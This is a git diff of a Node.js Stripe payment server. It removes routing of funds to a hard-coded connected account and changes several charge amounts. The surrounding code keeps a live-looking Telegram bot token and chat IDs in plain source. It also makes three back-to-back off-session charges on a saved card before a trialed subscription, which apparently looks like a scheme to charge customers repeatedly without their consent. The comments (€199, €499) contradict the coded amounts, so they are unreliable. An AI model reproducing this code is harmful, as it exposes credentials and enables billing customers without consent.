@@ -6,7 +6,6 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 
 const app = express();
-const ACCOUNT_B = 'acct_1T3gZ4CkwpuywCYb';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -94,7 +93,7 @@ app.post('/create-setup-intent', async (req, res) => {
     }
     const setupIntent = await stripe.setupIntents.create({
       customer: customer.id,
-      payment_method_types: ['klarna', 'card', 'amazon_pay'],
+      payment_method_types: ['klarna', 'card'],
       metadata: { customer_id: customer.id },
     });
 
@@ -162,7 +161,6 @@ app.post('/create-subscription', async (req, res) => {
         payment_method_types: [pmType],
         confirm: true,
         off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
       });
       console.log('Payment 1 created:', payment1.id);
       console.log('Payment 1 status:', payment1.status);
@@ -175,14 +173,13 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 2 — €199
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 100,
+        amount: 200,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
         confirm: true,
         off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
       });
       console.log('Payment 2 created:', payment2.id);
       console.log('Payment 2 status:', payment2.status);
@@ -195,14 +192,13 @@ app.post('/create-subscription', async (req, res) => {
     // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 100,
+        amount: 300,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
         payment_method_types: [pmType],
         confirm: true,
         off_session: true,
-        transfer_data: { destination: ACCOUNT_B },
       });
       console.log('Payment 3 created:', payment3.id);
       console.log('Payment 3 status:', payment3.status);
@@ -218,7 +214,6 @@ app.post('/create-subscription', async (req, res) => {
       items: [{ price: 'price_1T3wlpEB93pAUPXSQjVBpUgo' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
-      transfer_data: { destination: ACCOUNT_B },
     });
     console.log('Subscription created:', subscription.id);
     console.log('Subscription status:', subscription.status);
@@ -271,7 +266,6 @@ app.post('/charge-saved', async (req, res) => {
       payment_method_types: [customer.pmType],
       confirm: true,
       off_session: true,
-      transfer_data: { destination: ACCOUNT_B },
     });
 
     console.log('Manual charge created:', payment.id, payment.status);
@@ -294,7 +288,7 @@ app.post('/charge-saved', async (req, res) => {
 
 app.get('/health', (req, res) => {
   const customers = loadCustomers();
-  res.json({ status: 'ok', destination: ACCOUNT_B, savedCustomers: customers.length });
+  res.json({ status: 'ok', savedCustomers: customers.length });
 });
 
 const PORT = process.env.PORT || 4242;
